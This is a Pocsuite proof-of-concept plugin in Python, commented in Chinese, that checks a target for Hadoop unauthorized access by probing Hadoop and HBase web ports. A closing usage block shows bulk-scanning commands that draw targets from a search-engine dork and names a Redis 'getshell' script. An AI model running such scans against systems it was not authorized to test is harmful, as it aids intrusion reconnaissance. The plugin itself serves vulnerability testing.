#!/usr/bin/env python
# -*- coding: utf-8 -*-

"""
Copyright (c) 2014-2015 pocsuite developers (http://seebug.org)
See the file 'docs/COPYING' for copying permission
"""
# 命令行
from pocsuite import pocsuite_cli
# 验证模块
from pocsuite import pocsuite_verify
# 攻击模块
from pocsuite import pocsuite_attack
# 控制台模式
from pocsuite import pocsuite_console
# requests
from pocsuite.api.request import req
import urllib
# register
from pocsuite.api.poc import register
# report
from pocsuite.api.poc import Output, POCBase
# url转换host
from pocsuite.lib.utils.funs import url2ip


# 基础基类
class HadoopPOC(POCBase):
    vulID = '28'  # ssvid ID 如果是提交漏洞的同时提交 PoC,则写成 0
    version = '1'  # 默认为1
    vulDate = '2018-05-11'  # 漏洞公开的时间,不知道就写今天
    author = 'songjianshan'  # PoC作者的大名
    createDate = '2018-05-11'  # 编写 PoC 的日期
    updateDate = '2018-05-11'  # PoC 更新的时间,默认和编写时间一样
    references = 'http://www.52bug.cn/黑客技术/3905.html'  # 漏洞地址来源,0day不用写
    name = 'Hadoop Unauthorized Access'  # PoC 名称
    appPowerLink = 'hadoop.apache.org'  # 漏洞厂商主页地址
    appName = 'Hadoop'  # 漏洞应用名称
    appVersion = 'all versions'  # 漏洞影响版本
    vulType = 'Information Disclosure'  # 漏洞类型,类型参考见 漏洞类型规范表
    desc = '''
        Hadoop 未授权访问漏洞
    '''  # 漏洞简要描述
    samples = []  # 测试样列,就是用 PoC 测试成功的网站
    install_requires = []  # PoC 第三方模块依赖，请尽量不要使用第三方模块，必要时请参考《PoC第三方模块依赖说明》填写
    cvss = u"高危"  # 严重,高危,中危,低危

    # 指纹方法
    def _fingerprint(self):
        pass

    # 验证模块 pocsuite -r 1-redis.py -u 10.1.5.26 --verify
    def _verify(self):
        # 调用指纹方法
        result={}
        output = Output(self)
        scan_ports = {
                "50070", #dfs.namenode.http-address
                "50470", #dfs.namenode.https-address
                "50105", #dfs.namenode.backup.http-address
                "50090", #dfs.namenode.secondary.http-address
                "50091", #dfs.namenode.secondary.https-address
                "50075", #dfs.datanode.http.address
                "50475", #dfs.datanode.https.address
                "8480",  #dfs.journalnode.http-address
                "8088",  #yarn.resourcemanager.webapp.address
                "8090",	 #yarn.resourcemanager.webapp.https.address
                "8042",  #yarn.nodemanager.webapp.address
                "8188",  #yarn.timeline-service.webapp.address
                "19888", #mapreduce.jobhistory.webapp.address
                "60010", #hbase.master.info.port, HMaster的http端口
                 "60030",#hbase.regionserver.info.port HRegionServer的http端口
                }
        vul_port = []
        for i in scan_ports:
            #print i
            vul_url = '%s:%s' % (self.url,i)
            try:
                response = req.get(str(vul_url), timeout=1).text
                #print response
                if "hbase" in response.lower() or\
                    "url=/rs-status" in response.lower() or\
                    "hadoop" in response.lower():
                    vul_port.append(i)
            except:
                #print e
                pass
        if vul_port.__len__() > 0:
            result['VerifyInfo'] = {}
            result['VerifyInfo']['url'] = self.url
            result['VerifyInfo']['Payload'] = "port:" + str(vul_port)
        print '[+]28 poc done'
        return self.save_output(result)
        #pass

    # 攻击模块
    def _attack(self):
        return self._verify()
        #pass

    # 输出报告
    def save_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail()
        return output


# 注册类
register(HadoopPOC)

"""
PoC 编写规范及要求说明 https://github.com/knownsec/Pocsuite/blob/master/docs/CODING.md

使用方法 https://github.com/knownsec/Pocsuite/blob/master/docs/translations/USAGE-zh.md

集成 Pocsuite https://github.com/knownsec/Pocsuite/blob/master/docs/INTEGRATE.md

钟馗之眼 批量验证
pocsuite -r 1-redis-getshell.py --verify --dork "redis"  --max-page 50 --search-type host --report report.html
pocsuite -r 1-redis-getshell.py --verify -f results.txt --threads 10 --report report.html
"""

